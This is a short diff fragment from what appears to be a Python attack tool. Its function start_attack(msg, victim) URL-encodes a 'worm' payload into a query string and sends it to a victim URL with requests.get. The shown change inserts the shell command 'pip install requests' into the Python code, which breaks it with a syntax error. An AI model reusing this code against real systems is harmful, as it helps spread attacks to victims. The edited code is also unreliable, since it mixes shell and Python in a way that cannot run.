@@ -342,7 +342,7 @@ def start_attack(msg,victim):
     else:
         data = urllib.parse.urlencode(worm)
         url = f"{victim}?{data}"
-
+    pip install requests
     try:response = requests.get(url)
     
     except requests.exceptions.ConnectionError:
